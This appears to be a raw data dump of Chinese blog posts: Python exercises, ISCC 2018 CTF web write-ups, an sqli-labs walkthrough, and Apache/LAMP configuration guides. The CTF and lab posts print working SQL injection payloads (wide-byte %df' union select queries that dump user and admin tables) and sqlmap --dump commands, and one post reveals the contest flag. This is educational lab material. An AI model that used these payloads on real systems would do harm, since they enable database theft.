print(n,&quot;是一个素数&quot;)issushu(num) 运行结果： 案例7 题目：编写函数，接收一个字符串，分别统计大写字母、小写字母、数字、其他字符的个数，并以元组的形式返回结果 代码： 1234567891011121314151617181920212223# -*- coding=utf-8 -*-str1 = input(&quot;请输入字符串：&quot;)def upper_lower_other(str_1): upper = lower = other =0 list1 = list(str_1) for x in list1: if x.isupper(): upper += 1 elif x.islower(): lower += 1 else: other += 1 tup1 = (upper,lower,other) print(&quot;您输入的字符串中大写字母、小写字母以及其他字符数量依次为：\\n&quot;,tup1)upper_lower_other(str1) 运行结果： 案例8 题目：编写函数，可以接收任意多个整数并输出其中的最大值和所有整数之和。 代码： 12345678910111213141516171819# -*- coding=utf-8 -*-num_str_list = input(&quot;请输入您想输入的整数，如若多个请以空格分开:\\n&quot;)num_list = num_str_list.split()def num_input(num_list_can): sum = 0 for x in num_list_can: sum += int(x) print(&quot;您输入的整数之和为：&quot;,sum) num_max = max(num_list_can) print(&quot;您输入的整数中最大值为：&quot;,num_max)num_input(num_list) 运行结果：","categories":[{"name":"python3","slug":"python3","permalink":"http://zzqsmile.top/categories/python3/"}],"tags":[{"name":"python3","slug":"python3","permalink":"http://zzqsmile.top/tags/python3/"}]},{"title":"CTF-Web-2018-SQL注入的艺术","slug":"CTF/iscc-2018-web-002","date":"2018-05-02T01:00:00.000Z","updated":"2018-11-26T06:39:18.000Z","comments":true,"path":"2018/05/02/CTF/iscc-2018-web-002/","link":"","permalink":"http://zzqsmile.top/2018/05/02/CTF/iscc-2018-web-002/","excerpt":"题目地址：http://118.190.152.202:8015/比赛结束后可能失效","text":"题目地址：http://118.190.152.202:8015/比赛结束后可能失效 分析题目 打开题目网址，如下图所示： 可以点击首页按钮看一看 然后可以点击个人信息看一看 由于这道题提示我们是关于SQL注入，因此我们可以试一试看看id=1是否存在注入 尝试解题 单引号注入检测，页面返回如下图所示：正常 双引号注入检测，页面返回如下图所示：正常 这时候对于像我这这样的小白一样，就有点焦虑发愁了，然后我想到的是宽字节注入，这里不详细说明款字节注入，不懂的可以百度，大致就是由于数据库处理数据时候编码问题导致的注入，常用检测payload是 %df&#39; %df宽字节注入检测，如下图： 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1%df&#39; 结果如上图，页面返回了异常，这时候感觉攻破此题大有希望！ 一步一步来，先在后面加一个注释符--+ 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1%df&#39; --+ 返回页面如上图，页面返回正常，此时说明前面&#39;正好闭合了，在之后的过程中--+要一直都在 接下来使用and 1=1 和and 1=2进一步判断是否存在注入 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1%df&#39; and 1&#x3D;1 --+ and 1=1 测试页面返回正常 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1%df&#39; and 1&#x3D;2 --+ and 1=2 测试页面返回不正常 经上面判断可以确定，此处存在注入，接下来使用order by 二分法，判断表中字段数目。 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1%df&#39; order by 1 --+ 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1%df&#39; order by 10 --+ 此时说明表中字段数目没有超过10 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1%df&#39; order by 5 --+ 页面返回正常，此时说明字段数目超过5个 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1%df&#39; order by 7 --+ 页面返回正常，此时说明字段数目超过7个 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1%df&#39; order by 9 --+ 页面返回异常，此时说明字段数目不超过9个 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1%df&#39; order by 8 --+ 至此，我们可以判定表中一共8个字段，顺便提一句order by语句是将数据库查询结果按照第n个字段排序的，如果n不存在，就会报错，因此使用二分法判定有多少字段。如果还不懂的百度一下，这里不多解释了 下一步，使用union select联合查询 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1%df&#39; union select 1,2,3,4,5,6,7,8 --+ 页面正常，说明猜解的字段正确 然后寻找显示位 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,2,3,4,5,6,7,8 --+ 将前面id值1前面加一个-（负号），使其前面查询无结果，输出后面联合查询结果，如上图 利用显示位，收集数据库信息 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,database(),3,version(),5,6,user(),8 --+ 接下来暴表 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,table_name,3,4,5,6,7,8 from information_schema.tables where table_schema &#x3D; 0x62616a69 --+ 批量暴表 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema &#x3D; 0x62616a69 --+ 结果就一张表，也许此处一共就一张表，也有可能输出框长度有限，那接下来先暴字段 批量暴user表中字段 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,group_concat(column_name),3,4,5,6,7,8 from information_schema.columns where table_schema &#x3D; 0x62616a69 and table_name &#x3D; 0x61646d696e73 --+ 可以看到admins表中字段有 id,userName,userPwd,email,sex,role,money,flag,到这可以看到我们关心的flag字段，下一步就是查看你想查看哪个字段里面的内容 查看表中字段内容 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,group_concat(id,userName,userPwd,email,sex,role,money,flag),3,4,5,6,7,8 from admins --+ 可以看到字段里面所有内容都出来了 单独查看flag字段内容 1http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,flag,3,4,5,6,7,8 from admins --+ 到此这道题flag已经拿到，页面提交flag我就不在做图了。flag : Y0u_@@33w_dxxmn_9rf0Od 以上是手工做法，如果自己对手工比较熟练的话，不想使用手动注入，也不想费时间，我们可以使用sqlmap跑一下，教程如下 使用sqlmap跑这道题首先我先清理下我linux上面sqlmap的缓存 1[root@localhost sqlmap]# python sqlmap.py --purge-output step1. 寻找注入点 1[root@localhost sqlmap]# python sqlmap.py -u &quot;http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1&#39;&quot; --tamper&#x3D;unmagicquotes.py 中途选项一般情况下都选 Y ， 返回如下 可以看到判定存在注入,关键信息都输出出来了，这时候我们可以进行下一步了 step2.暴库 1[root@localhost sqlmap]# python sqlmap.py -u &quot;http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1&#39;&quot; --dbs --tamper&#x3D;unmagicquotes.py 返回结果如下： step3.查看当前数据库 1[root@localhost sqlmap]# python sqlmap.py -u &quot;http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1&#39;&quot; --current-db --tamper&#x3D;unmagicquotes.py 返回结果如下： step4.暴出当前数据库baji里面的表 1[root@localhost sqlmap]# python sqlmap.py -u &quot;http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1&#39;&quot; -D baji --tables --tamper&#x3D;unmagicquotes.py 返回结果如下： step5.暴出当前数据库baji里面admins表中字段 1[root@localhost sqlmap]# python sqlmap.py -u &quot;http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1&#39;&quot; -D baji -T admins --columns --tamper&#x3D;unmagicquotes.py 返回结果如下： step6.暴出当前数据库baji里面admins表中字段里面的内容 1[root@localhost sqlmap]# python sqlmap.py -u &quot;http:&#x2F;&#x2F;118.190.152.202:8015&#x2F;index.php?id&#x3D;1&#39;&quot; -D baji -T admins -C email,flag,id,money,role,sex,userName,userPwd --dump --tamper&#x3D;unmagicquotes.py 返回如下： 最终我们可以成功拿到flag : Y0u_@@33w_dxxmn_9rf0Od","categories":[{"name":"CTF","slug":"CTF","permalink":"http://zzqsmile.top/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://zzqsmile.top/tags/CTF/"}]},{"title":"CTF-2018-Web-比较数字大小","slug":"CTF/iscc-2018-web-001","date":"2018-05-01T01:00:00.000Z","updated":"2018-11-26T06:40:06.000Z","comments":true,"path":"2018/05/01/CTF/iscc-2018-web-001/","link":"","permalink":"http://zzqsmile.top/2018/05/01/CTF/iscc-2018-web-001/","excerpt":"题目地址：http://118.190.152.202:8014/比赛结束后地址可能失效","text":"题目地址：http://118.190.152.202:8014/比赛结束后地址可能失效 解题方法 打开题目网址，如下图所示： 首先养成好习惯，先查看网页源代码，查看关键字段信息，并注意是否会有彩蛋！ 分析:通过查看代码，我们可以知道这个表单输入款内最大输入长度为3，post提交方式 尝试输入内容，测试这道题目的功能 输入123，发现返回的是 数字太小了，并且确实是最大输入3位数 那我们输入最大三位数 999 试一试，发现还是很小： 回想一下，题目提示我们只要比服务器上数字大就好，因此我们就要想办法提交更大的值. 要想绕过限制，我想到的第一个办法是 科学记数法 通过测试发现此方法行不通，输入9e9，结果人家返回必须是数字。 第二种绕过方法，由于题目对输入进行的是前端绕过，因此，我们可以使用burpsuite拦截包修改参数值，看看能否绕过 设置好代理，打开监听。随便输入一个数字132，然后提交 然后就可以通过burpsuite看到拦截到的请求包，如下 修改参数值，点击转发按钮，如下图所示： 返回浏览器，看页面返回信息，如下图所示： 可以看到说明我们已经绕过限制，提交的数值也大于服务器上的数值，得到了key 然后将key作为flag提交 返回如下，结果正确 没毛病，这道题到此为止，解答完毕！ title: CTF-2018-Web-比较数字大小date: 2018-05-01 09:00:00categories: CTFtags: CTF 题目地址：http://118.190.152.202:8014/比赛结束后地址可能失效 解题方法 打开题目网址，如下图所示： 首先养成好习惯，先查看网页源代码，查看关键字段信息，并注意是否会有彩蛋！ 分析:通过查看代码，我们可以知道这个表单输入款内最大输入长度为3，post提交方式 尝试输入内容，测试这道题目的功能 输入123，发现返回的是 数字太小了，并且确实是最大输入3位数 那我们输入最大三位数 999 试一试，发现还是很小： 回想一下，题目提示我们只要比服务器上数字大就好，因此我们就要想办法提交更大的值. 要想绕过限制，我想到的第一个办法是 科学记数法 通过测试发现此方法行不通，输入9e9，结果人家返回必须是数字。 第二种绕过方法，由于题目对输入进行的是前端绕过，因此，我们可以使用burpsuite拦截包修改参数值，看看能否绕过 设置好代理，打开监听。随便输入一个数字132，然后提交 然后就可以通过burpsuite看到拦截到的请求包，如下 修改参数值，点击转发按钮，如下图所示： 返回浏览器，看页面返回信息，如下图所示： 可以看到说明我们已经绕过限制，提交的数值也大于服务器上的数值，得到了key 然后将key作为flag提交 返回如下，结果正确 没毛病，这道题到此为止，解答完毕！","categories":[{"name":"CTF","slug":"CTF","permalink":"http://zzqsmile.top/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://zzqsmile.top/tags/CTF/"}]},{"title":"sqli-labs Less-1","slug":"web安全/sqli-labs-Less1","date":"2018-04-01T01:00:00.000Z","updated":"2019-03-10T06:44:08.000Z","comments":true,"path":"2018/04/01/web安全/sqli-labs-Less1/","link":"","permalink":"http://zzqsmile.top/2018/04/01/web%E5%AE%89%E5%85%A8/sqli-labs-Less1/","excerpt":"1.首先来到less-1","text":"1.首先来到less-1 2.请以数字值作为参数输入id。 url后面输入?id=1 大家可能此时与我不同的是 1your sql statement is SELECT * FROM users WHERE id&#x3D;&#39;1&#39; LIMIT 0,1 这是为了方便我们自己看到底执行的sql语句是什么显示出来的。那么你也可以添加以下，方法如下：编辑less-1下的index.php文件将代码echo &quot;your sql statement is &quot;.$sql.&quot;&lt;br&gt;&quot;;插入到如下图所示位置 之后刷新页面即可。 3.寻找注入点 在正常的参数值后面后加一个英文字符 &#39;,可以看到页面出现了异常，说明此处可能存在注入。 接下来在后面加入--+，发现页面显示正常，这是因为--+注释了后面的sql语句，即注入的&#39;正好闭合了sql语句中的单引号，如下： 然后继续注入&#39; and 1=1和’ and 1=2，进一步确认注入点，如下：&#39; and 1=1页面显示正常，’ and 1=2页面显示不正常。 至此，我们可以确认此注入点存在sql注入 4.接下来用order by 语句猜有几个字段实际操作中采用二分法。当插入?id=1&#39; order by 3 --+，页面正常显示：url: 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; 当插入?id=1&#39; order by 4 --+，页面异常： 此时说明查询的表中有3个字段 5. 此时可以继续使用 union select联合查询。 页面正常无变化，没关系，这是limit 限制了只显示一条结果，即前面id = 1 已经有一个结果了，那好，我们将前面设置为0，让它查不到结果看看. url: 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0%27%20union%20select%201,2,3%20--+ 惊喜吧！！看到2，3了吧。说明第2、3个字段可以显示到页面 6. 先来看看常用查询的数据库，版本号，当前登录的账号信息吧！ 可以查询到数据库名security,版本5.5.53，当前登录账户:root@localhost 7. 接下来查表名 url: 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 1,2,table_name from information_schema.tables where table_schema &#x3D; &quot;security&quot; --+ 可以看到查询到一个表，接下来使用group_concat()函数将所有表列出来 url: 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema &#x3D; &quot;security&quot; --+ 可以看到一共四个表：emails,referers,uagents,users 8.接下来查关注的users表中字段 url: 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;users&quot; and table_schema &#x3D; &quot;security&quot; --+ 9. 最后就是查看表中字段内容了 url: 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 1,group_concat(username),group_concat(password) from users --+ 10.这样有点不美观，可以这样做： url: 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 1,2,concat_ws(&quot;~&quot;,username,password) from users --+ 显示了一个用户名密码，不爽： url： 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 1,2,group_concat(concat_ws(&quot;~&quot;,username,password)) from users --+ 这样就完美了，nice. 最后附图一张，information_schema数据库主要表结构 说明：当数据库版本大于5以上，数据库中将有information_schema数据库，这个数据库中包含数据库里面所有数据库的表、字段以及数据库名字。schemata 这张表存放了所有数据库的信息tables 这张表存放了所有数据库的所有表的信息columns 这张表存放了所有数据库的所有表中的字段信息","categories":[{"name":"web安全","slug":"web安全","permalink":"http://zzqsmile.top/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"http://zzqsmile.top/tags/sqli-labs/"}]},{"title":"apache服务安全配置","slug":"Server/2018-03-11-apache服务安全配置","date":"2018-03-11T01:00:00.000Z","updated":"2020-08-23T12:56:08.721Z","comments":true,"path":"2018/03/11/Server/2018-03-11-apache服务安全配置/","link":"","permalink":"http://zzqsmile.top/2018/03/11/Server/2018-03-11-apache%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/","excerpt":"0x01.错误详情页隐藏错误详情页测试方法 访问网站不存在的页面，如果网站没有做404页面重定向，就会泄露其敏感信息如下图","text":"0x01.错误详情页隐藏错误详情页测试方法 访问网站不存在的页面，如果网站没有做404页面重定向，就会泄露其敏感信息如下图 查看响应头信息 12345678zzq@ubuntu:~$ curl -I http:&#x2F;&#x2F;192.168.178.135&#x2F;HTTP&#x2F;1.1 200 OKDate: Tue, 01 May 2018 11:58:36 GMTServer: Apache&#x2F;2.4.7 (Ubuntu) #中间件版本及操作系统X-Powered-By: PHP&#x2F;5.5.9-1ubuntu4.24 #显示服务端脚本语言及其版本号Link: &lt;http:&#x2F;&#x2F;192.168.178.135&#x2F;index.php&#x2F;wp-json&#x2F;&gt;; rel&#x3D;&quot;https:&#x2F;&#x2F;api.w.org&#x2F;&quot;Link: &lt;http:&#x2F;&#x2F;192.168.178.135&#x2F;&gt;; rel&#x3D;shortlinkContent-Type: text&#x2F;html; charset&#x3D;UTF-8 修复方法1).修改配置文件：etc/apache2/apache2.conf 或者/etc/httpd/conf/httpd.conf隐藏中间件信息。修改或添加以下配置12ServerTokens ProdServerSignature Off 2).修改配置文件：/etc/php5/apache2/php.ini隐藏PHP信息，将expose_php = On 改为 expose_php = Off1expose_php &#x3D; Off 3).修改配置文件： /etc/apache2/sites-enabled/000-default.conf设置网站根目录为 /var/www/html/1zzq@ubuntu:~$ sudo vim &#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf 4).修改配置文件：/etc/apache2/apache2.conf将网站根目录里面的AllowOverride None设置AllowOverride All，保存退出！1zzq@ubuntu:~$ sudo vim &#x2F;etc&#x2F;apache2&#x2F;apache2.conf 12345&lt;Directory &#x2F;var&#x2F;www&#x2F;html&gt; Options Indexes FollowSymLinks AllowOverride All #设置为All，此目录下的.htaccess 指令才会生效 Require all granted&lt;&#x2F;Directory&gt; 5).修改完以上配置文件保存并退出，然后重启apache服务1zzq@ubuntu:~$ sudo service apache2 restart 6).再次访问错误页面，已经没有刚才泄露的信息了 12345678910zzq@ubuntu:~$ sudo curl -I http:&#x2F;&#x2F;192.168.178.135&#x2F;HTTP&#x2F;1.1 200 OKDate: Tue, 01 May 2018 12:26:10 GMTServer: ApacheLast-Modified: Tue, 17 Apr 2018 02:49:12 GMTETag: &quot;2cf6-56a02621ccf1c&quot;Accept-Ranges: bytesContent-Length: 11510Vary: Accept-EncodingContent-Type: text&#x2F;html 0x02.重定向404页面加固步骤：1).在网站根目录新建一个.htaccess文件，内容为：1234zzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ cd &#x2F;var&#x2F;www&#x2F;html&#x2F;zzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ ls -a. .. index.html wordpresszzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ sudo vim .htaccess 1ErrorDocument 404 &#x2F;404.html 123zzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ ls -a. .. .htaccess index.html wordpresszzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ 2).在同目录下新建404.html,文件名与上一步指定的文件名相同，即404.html1zzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ sudo vim 404.html 123456789&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;404页面&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;Hello，This is 404 page!!&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 3).测试一下，可以看到我们自定义的页面已经生效 注意事项1、不要将404错误直接转向到网站首页，这将导致首页不被收录；2、/404.html 前面不要带主域名，否则返回的状态码是302或200状态码；3、自定义的404页面必须是大于512B，如果小于这个大小，浏览器就不会执行； 0x03.列目录问题什么是列目录 当Web服务器配置不当的时候，如果当前目录不存在默认文件（比如index.html），Apache会列出当前目录下所有文件，造成敏感信息泄露。我们可以测试一下，测试方法：首先我们可以删除存在的默认文件index.html 1234567zzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ ls404.html index.html wordpresszzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ sudo cp index.html index.html.bakzzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ sudo rm -rf index.htmlzzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ ls404.html index.html.bak wordpresszzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ 然后再访问网站 修复方法修改配置文件：/etc/apache2/apache2.conf1zzq@ubuntu:~$ sudo vim &#x2F;etc&#x2F;apache2&#x2F;apache2.conf 12345&lt;Directory &#x2F;var&#x2F;www&#x2F;html&gt; #这必须是网站的根目录 Options Indexes FollowSymLinks AllowOverride All Require all granted&lt;&#x2F;Directory&gt; Options Indexes FollowSymLinks这里的indexes 是指在目录中要存在index文件，如果不存在把文件列出来，如果存在index文件可以直接显示index文件，因此每个目录都必须存在index文件，如果不存在有可能此目录把文件全部列出来。 删除Indexes这个参数，保存退出，然后重启apache服务12345&lt;Directory &#x2F;var&#x2F;www&#x2F;html&gt; Options FollowSymLinks AllowOverride All Require all granted&lt;&#x2F;Directory&gt; 1zzq@ubuntu:~$ sudo service apache2 restart 再次访问就会出现403Forbidden页面如下图所示： 0x04.删除默认安装页面测试方法默认安装完成之后,会有一个默认的apache测试页面，里面会泄露一些信息，包括网站目录，操作系统，版本等等 加固方法step1.编辑配置文件/etc/httpd/conf.d/welcome.conf 1[root@localhost ~]# vim &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf step2.找到如下行 step3.修改为如下,并保存退出 step4.重启apache服务 1[root@localhost ~]# service httpd restart 修复验证step1.在网站根目录下创建一个index.php文件 step2.再次访问 0x05.文件权限 在图片上传过程中，特对是针对上传图片的目录和上传的文件内容必须经过严格控制，因为可能由于权限过高导致上传被突破后，直接放入小马，这个站点就被拿下了，所以对上传目录进行权限控制。 漏洞测试 加固方法：step1.编辑http.conf文件 1[root@localhost upload]# vim &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf step2.限定目录没有执行的PHP脚本执行的权限 step3.编辑重启服务 1[root@localhost upload]# service httpd restart step4.再次测试漏洞是否存在 可以看到/upload/目录下的php小马已经不能用了","categories":[{"name":"Server","slug":"Server","permalink":"http://zzqsmile.top/categories/Server/"}],"tags":[{"name":"中间件","slug":"中间件","permalink":"http://zzqsmile.top/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"}]},{"title":"LAMP环境下虚拟主机配置(基于端口)","slug":"Server/2018-03-10-LAMP虚拟主机基于端口","date":"2018-03-10T01:00:00.000Z","updated":"2018-05-18T11:40:26.000Z","comments":true,"path":"2018/03/10/Server/2018-03-10-LAMP虚拟主机基于端口/","link":"","permalink":"http://zzqsmile.top/2018/03/10/Server/2018-03-10-LAMP%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E5%9F%BA%E4%BA%8E%E7%AB%AF%E5%8F%A3/","excerpt":"还是在之前LAMP虚拟主机配置基于域名基础上面做，只需稍加更改即可 一、修改httpd（apache）配置文件 默认只有80端口，增加81 8080两个端口如下图所示：","text":"还是在之前LAMP虚拟主机配置基于域名基础上面做，只需稍加更改即可 一、修改httpd（apache）配置文件 默认只有80端口，增加81 8080两个端口如下图所示： 1[root@localhost ~]# vim &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf 注释掉在基于域名虚拟主机配置是的配置，如下图所示： 到配置文件末尾更改虚假主机配置如下所示： 123456789101112131415161718192021222324&lt;VirtualHost 192.168.3.112:80&gt; ServerAdmin www.zzqa.com DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;zzqa&#x2F; ServerName 192.168.3.112 ErrorLog logs&#x2F;dummy-host.zzqa.com-error_log CustomLog logs&#x2F;dummy-host.zzqa.com-access_log common&lt;&#x2F;VirtualHost&gt;&lt;VirtualHost 192.168.3.112:81&gt; ServerAdmin www.zzqb.com DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;zzqb&#x2F; ServerName 192.168.3.112 ErrorLog logs&#x2F;dummy-host.zzqb.com-error_log CustomLog logs&#x2F;dummy-host.zzqb.com-access_log common&lt;&#x2F;VirtualHost&gt;&lt;VirtualHost 192.168.3.112:8080&gt; ServerAdmin www.zzqc.com DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;zzqc&#x2F; ServerName 192.168.3.112 ErrorLog logs&#x2F;dummy-host.zzqc.com-error_log CustomLog logs&#x2F;dummy-host.zzqc.com-access_log common&lt;&#x2F;VirtualHost&gt; 保存文件并退出。 重启服务(如果失败原因是端口原因，请换个端口试试) 1[root@localhost ~]# service httpd restart 二、DNS Server配置 在这个实验中不用在DNS Serve修改任何东西，这里我只是想说明一下原因：在之前基于域名配置虚拟主机的实验中我们已经将所有的域名解析地址指向了同一个地址，即（192.168.3.112）,说到这也许有人迷了，192.168.3.112不是DNS Server的地址吗？其实是因为我们的DNS Server 和httpd服务都是在一个linux主机上面，这点别迷了。说了这段话其实还是更好的让大家理解，是真正理解原理。清楚的知道自己每一步配置的什么，为什么这样配置。不要盲目照着博客做，需要理解其原理。 三、测试如下图所示 OK 到此为止，我们的LAMP环境下虚拟主机配置三种方法已经全部做完。由于环境不同，做的时候也许会出现不同错误，这点大家养成好习惯多多百度解决问题，实在解决不了再请教身边牛人。","categories":[{"name":"Server","slug":"Server","permalink":"http://zzqsmile.top/categories/Server/"}],"tags":[{"name":"LAMP","slug":"LAMP","permalink":"http://zzqsmile.top/tags/LAMP/"}]},{"title":"LAMP环境下虚拟主机配置(基于域名)","slug":"Server/2018-03-09-LAMP虚拟主机基于域名","date":"2018-03-09T01:00:00.000Z","updated":"2018-05-19T11:18:54.000Z","comments":true,"path":"2018/03/09/Server/2018-03-09-LAMP虚拟主机基于域名/","link":"","permalink":"http://zzqsmile.top/2018/03/09/Server/2018-03-09-LAMP%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%90%8D/","excerpt":"在之前LAMP环境下虚拟主机配置(基于IP) 继续做这个基于域名的虚拟主机配置，只需要修改之前的配置内容即可。 一、首先修改一下apache的配置文件 首先修改一下配置文件中的#NameVirtualHost *:80,修改内容如下图所示:192.168.3.112是dns sever的地址，即Linux本机IP","text":"在之前LAMP环境下虚拟主机配置(基于IP) 继续做这个基于域名的虚拟主机配置，只需要修改之前的配置内容即可。 一、首先修改一下apache的配置文件 首先修改一下配置文件中的#NameVirtualHost *:80,修改内容如下图所示:192.168.3.112是dns sever的地址，即Linux本机IP 1[root@localhost ~]# vim &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf 然后到文件末尾修改之前的虚拟主机配置文件，如下所示： 123456789101112131415161718192021222324&lt;VirtualHost 192.168.3.112:80&gt; ServerAdmin www.zzqa.com DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;zzqa&#x2F; ServerName www.zzqa.com ErrorLog logs&#x2F;dummy-host.zzqa.com-error_log CustomLog logs&#x2F;dummy-host.zzqa.com-access_log common&lt;&#x2F;VirtualHost&gt;&lt;VirtualHost 192.168.3.112:80&gt; ServerAdmin www.zzqb.com DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;zzqb&#x2F; ServerName www.zzqb.com ErrorLog logs&#x2F;dummy-host.zzqb.com-error_log CustomLog logs&#x2F;dummy-host.zzqb.com-access_log common&lt;&#x2F;VirtualHost&gt;&lt;VirtualHost 192.168.3.112:80&gt; ServerAdmin www.zzqc.com DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;zzqc&#x2F; ServerName www.zzqc.com ErrorLog logs&#x2F;dummy-host.zzqc.com-error_log CustomLog logs&#x2F;dummy-host.zzqc.com-access_log common&lt;&#x2F;VirtualHost&gt; 修改完保存并退出 重启apache服务 1[root@localhost ~]# service httpd restart 二、修改DNS解析配置123[root@localhost ~]# cd &#x2F;var&#x2F;named&#x2F;[root@localhost named]# lsdata dynamic named.ca named.empty named.localhost named.loopback sec.com slaves zzqa.com zzqb.com zzqc.com 1[root@localhost named]# vim zzqa.com 123456789101112$TTL 1D@ IN SOA @ rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS @@ IN A 192.168.3.112www IN A 192.168.3.112game IN A 192.168.3.112 1[root@localhost named]# vim zzqb.com 1234567891011$TTL 1D@ IN SOA @ rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS @@ IN A 192.168.3.112www IN A 192.168.3.112game IN A 192.168.3.112 1[root@localhost named]# vim zzqc.com 1234567891011$TTL 1D@ IN SOA @ rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS @@ IN A 192.168.3.112www IN A 192.168.3.112game IN A 192.168.3.112 重启服务12345[root@localhost named]# service named restart停止 named：. [确定]启动 named： [确定][root@localhost named]# 三、测试(注意浏览器缓存问题，多刷新几次，只要都正常就是没问题的)","categories":[{"name":"Server","slug":"Server","permalink":"http://zzqsmile.top/categories/Server/"}],"tags":[{"name":"LAMP","slug":"LAMP","permalink":"http://zzqsmile.top/tags/LAMP/"}]},{"title":"LAMP环境下虚拟主机配置(基于IP)","slug":"Server/2018-03-08-LAMP虚拟主机基于IP","date":"2018-03-08T01:00:00.000Z","updated":"2018-05-18T11:35:22.000Z","comments":true,"path":"2018/03/08/Server/2018-03-08-LAMP虚拟主机基于IP/","link":"","permalink":"http://zzqsmile.top/2018/03/08/Server/2018-03-08-LAMP%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E5%9F%BA%E4%BA%8EIP/","excerpt":"本教程实验环境： 123[root@localhost ~]# cat &#x2F;etc&#x2F;redhat-release CentOS release 6.5 (Final)[root@localhost ~]#","text":"本教程实验环境： 123[root@localhost ~]# cat &#x2F;etc&#x2F;redhat-release CentOS release 6.5 (Final)[root@localhost ~]# 一、首先在dns server上面配置域名解析(1).在dns server上面创建三个域名1[root@localhost ~]# vim &#x2F;etc&#x2F;named.rfc1912.zones 